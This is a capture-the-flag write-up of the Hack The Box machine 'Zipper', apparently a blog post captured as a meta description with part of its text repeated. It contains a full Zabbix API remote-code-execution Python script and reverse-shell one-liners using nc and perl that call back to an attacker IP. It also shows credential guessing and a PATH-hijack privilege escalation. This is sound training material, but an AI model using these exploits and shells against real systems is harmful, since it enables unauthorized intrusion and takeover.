<meta name="description" content="Quick Summary Hey guys today Zipper retired and here’s my write-up. Owning user on this box was challenging because we have to exploit an RCE vulnerability which is not really easy and then we have to get a stable shell to be able to enumerate, for the privilege escalation it was easy but I also liked it because it was a binary exploitation. It was a very fun box and I liked it. It’s a linux box and its ip is 10.10.10.108 , I added it to /etc/hosts as zipper.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC zipper.htb We only get 2 ports , http on port 80 and ssh on port 22. so we are going to check http HTTP enumeration By visiting zipper.htb we get the default apache2 page : So I’m going to run gobuster with directory-list-2.3-medium.txt to see if there are any sub directories : gobuster -u http://zipper.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Output : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://zipper.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 4m10s ===================================================== 2019/02/22 08:50:38 Starting gobuster ===================================================== /zabbix (Status: 301) We got /zabbix , let’s look at that in the browser : We get this login page , we don’t have credentials but down there there’s an option to sign in as a guest , but before we do that let’s get an idea about zabbix Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption. -Wikipedia So basically it’s a server monitoring tool , let’s login as a guest and see what we can get We get this dashboard , but we are not privileged to do anything because we are guest After some enumeration we will notice in : Monitoring –&gt; Latest data , Zapper&#39;s Backup Script Now we have a potential username : zapper , we can try to brute force or fuzz the password , but a quick guess worked for me , the username is the password zapper : zapper GUI access disabled , on exploit-db there’s an authenticated remote code execution exploit for an old version of zabbix , check it here , Unfortunately valid credentials are not enough to exploit it , if we take a look here : We also need hostid , and to get that we need to get GUI access GUI access through zabbix-cli There’s a cli tool for zabbix on github , we can use it to gain GUI access. Installation and configuration is simple you will get the source from github then install it with install.py install then you will create a conf file for it by executing zabbix-cli --config, it will be saved in $HOME/.zabbix-cli/zabbix-cli.conf , open the conf file and in Zabbix API section add this line zabbix_api_url=http://10.10.10.108/zabbix. For details read the documentation here Then we will run zabbix-cli it will ask for a username and a password , we already have them zapper : zapper if we executed show_usergroups we will see that zapper is in a group called No access to the fronted and GUI access to that group is disabled We will create a new group and call it guiaccess and leave GUI access as system default create_usergroup Then we will add zapper to that group and delete him from No access to the fronted add_user_to_usergroup remove_user_from_usergroup Now if we try to login again as zapper we will get the dashboard : RCE and getting user From Configuration –&gt; Hosts we have 2 hosts and the second one is the availabe one : If we click on it we will get an edit page , but we will notice that the host id is included in the url as a GET parameter : Now we can edit the python exploit and add the host id : 10106 , this is how the basic login info in the script will look like : And we get a decent shell , but this shell executes commands through API requests which is not efficient , so we will get a reverse shell like this : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f I got this shell from payload all the things Problem is , we will find that we are in a docker container , and that’s actually a bad rabbit hole and when I was doing this box for the first time i spent a lot of time trying to escape this docker container , And eventually i found out that this is the wrong server. If we take a look at this page from zabbix documentation , this part : there’s an option called execute_on , which has 2 possible values : 0 to execute on zabbix agent , and 1 to execute on zabbix server. We don’t have that option included in the exploit so we are using the default option 1 which means we are executing commands on zabbix server. So we will edit the exploit json data and add &quot;execute_on&quot; : &quot;0&quot; in those 2 parts : After that we will run the exploit again and now it will run on the right server , however the shell that we used before didn’t work and died immediately because the exploit crashed for some reason , I had to comment out the last line which prints the result : print cmd_exe[&quot;result&quot;][&quot;value&quot;] , but it didn’t fix it , so I tried some other shells and the perl one worked : perl -e &#39;use Socket;$i=&quot;10.10.xx.xx&quot;;$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39; Then I used used python3 pty to get a proper shell , python2 didn’t exist on the server Final exploit after edits : #!/usr/bin/python # -*- coding: utf-8 -*- # Exploit Title: Zabbix RCE with API JSON-RPC # Date: 06-06-2016 # Exploit Author: Alexander Gurin # Vendor Homepage: http://www.zabbix.com # Software Link: http://www.zabbix.com/download.php # Version: 2.2 - 3.0.3 # Tested on: Linux (Debian, CentOS) # CVE : N/A import requests import json import readline ZABIX_ROOT = &#39;http://10.10.10.108/zabbix&#39; ### Zabbix IP-address url = ZABIX_ROOT + &#39;/api_jsonrpc.php&#39; ### Don&#39;t edit login = &#39;zapper&#39; ### Zabbix login password = &#39;zapper&#39; ### Zabbix password hostid = &#39;10106&#39; ### Zabbix hostid ### auth payload = { &quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;method&quot; : &quot;user.login&quot;, &quot;params&quot;: { &#39;user&#39;: &quot;&quot;+login+&quot;&quot;, &#39;password&#39;: &quot;&quot;+password+&quot;&quot;, }, &quot;auth&quot; : None, &quot;id&quot; : 0, } headers = { &#39;content-type&#39;: &#39;application/json&#39;, } auth = requests.post(url, data=json.dumps(payload), headers=(headers)) auth = auth.json() while True: cmd = raw_input(&#39;\033[41m[zabbix_cmd]&gt;&gt;: \033[0m &#39;) if cmd == &quot;&quot; : print &quot;Result of last command:&quot; if cmd == &quot;quit&quot; : break ### update payload = { &quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;script.update&quot;, &quot;params&quot;: { &quot;scriptid&quot;: &quot;1&quot;, &quot;command&quot;: &quot;&quot;+cmd+&quot;&quot;, &quot;execute_on&quot; : &quot;0&quot; }, &quot;auth&quot; : auth[&#39;result&#39;], &quot;id&quot; : 0, } cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers)) ### execute payload = { &quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;script.execute&quot;, &quot;params&quot;: { &quot;scriptid&quot;: &quot;1&quot;, &quot;hostid&quot;: &quot;&quot;+hostid+&quot;&quot; }, &quot;auth&quot; : auth[&#39;result&#39;], &quot;id&quot; : 0, &quot;execute_on&quot; : &quot;1&quot; } cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers)) cmd_exe = cmd_exe.json() # print cmd_exe[&quot;result&quot;][&quot;value&quot;] First thing we will notice that we are zabbix and in /home there’s a directory for the user zapper We can’t read user.txt and we can’t go into .ssh There’s another directory called utils which contains 2 files , backup.sh and zabbix-service cat backup.sh We see that it has a hardcoded password in it : ZippityDoDah , we can try to su to zapper with that password And it worked , now we can get the ssh key from .ssh and have ssh connection And we owned user !

So we will edit the exploit json data and add &quot;execute_on&quot; : &quot;0&quot; in those 2 parts : After that we will run the exploit again and now it will run on the right server , however the shell that we used before didn’t work and died immediately because the exploit crashed for some reason , I had to comment out the last line which prints the result : print cmd_exe[&quot;result&quot;][&quot;value&quot;] , but it didn’t fix it , so I tried some other shells and the perl one worked : perl -e &#39;use Socket;$i=&quot;10.10.xx.xx&quot;;$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39; Then I used used python3 pty to get a proper shell , python2 didn’t exist on the server Final exploit after edits : #!/usr/bin/python # -*- coding: utf-8 -*- # Exploit Title: Zabbix RCE with API JSON-RPC # Date: 06-06-2016 # Exploit Author: Alexander Gurin # Vendor Homepage: http://www.zabbix.com # Software Link: http://www.zabbix.com/download.php # Version: 2.2 - 3.0.3 # Tested on: Linux (Debian, CentOS) # CVE : N/A import requests import json import readline ZABIX_ROOT = &#39;http://10.10.10.108/zabbix&#39; ### Zabbix IP-address url = ZABIX_ROOT + &#39;/api_jsonrpc.php&#39; ### Don&#39;t edit login = &#39;zapper&#39; ### Zabbix login password = &#39;zapper&#39; ### Zabbix password hostid = &#39;10106&#39; ### Zabbix hostid ### auth payload = { &quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;method&quot; : &quot;user.login&quot;, &quot;params&quot;: { &#39;user&#39;: &quot;&quot;+login+&quot;&quot;, &#39;password&#39;: &quot;&quot;+password+&quot;&quot;, }, &quot;auth&quot; : None, &quot;id&quot; : 0, } headers = { &#39;content-type&#39;: &#39;application/json&#39;, } auth = requests.post(url, data=json.dumps(payload), headers=(headers)) auth = auth.json() while True: cmd = raw_input(&#39;\\033[41m[zabbix_cmd]&gt;&gt;: \\033[0m &#39;) if cmd == &quot;&quot; : print &quot;Result of last command:&quot; if cmd == &quot;quit&quot; : break ### update payload = { &quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;script.update&quot;, &quot;params&quot;: { &quot;scriptid&quot;: &quot;1&quot;, &quot;command&quot;: &quot;&quot;+cmd+&quot;&quot;, &quot;execute_on&quot; : &quot;0&quot; }, &quot;auth&quot; : auth[&#39;result&#39;], &quot;id&quot; : 0, } cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers)) ### execute payload = { &quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;script.execute&quot;, &quot;params&quot;: { &quot;scriptid&quot;: &quot;1&quot;, &quot;hostid&quot;: &quot;&quot;+hostid+&quot;&quot; }, &quot;auth&quot; : auth[&#39;result&#39;], &quot;id&quot; : 0, &quot;execute_on&quot; : &quot;1&quot; } cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers)) cmd_exe = cmd_exe.json() # print cmd_exe[&quot;result&quot;][&quot;value&quot;] First thing we will notice that we are zabbix and in /home there’s a directory for the user zapper We can’t read user.txt and we can’t go into .ssh There’s another directory called utils which contains 2 files , backup.sh and zabbix-service cat backup.sh We see that it has a hardcoded password in it : ZippityDoDah , we can try to su to zapper with that password And it worked , now we can get the ssh key from .ssh and have ssh connection And we owned user ! Privilege Escalation and getting root If we take a look at the utils directory again and execute zabbix-service : It asks us start or stop? then it executes something and exits , we will check if that binary is a suid binary : find /home/zapper/utils -perm -4000 It’s a suid binary , we need to know what is it doing. Without reverse engineering , strings was enough : strings zabbix-service This command is being executed when we type start : systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent , so what are we going to do is the same as we did in Dab , the only difference is in dab we hijacked a shared library that the binary used , but here we will hijack a binary. By default systemctl points to /bin/systemctl We will create a c program to execute /bin/bash : Then we will compile it with gcc : gcc exploit.c -o systemctl Now we have our fake binary ready : We will add /home/zapper/utils as the first entry in PATH env variable , so the system will look there first : export PATH=/home/zapper/utils:$PATH This is changing the PATH variable to /home/zapper/utils: + the old path Now systemctl points to our fake binary , let’s run zabbix-service : And we owned root ! That’s it , Feedback is appreciated !
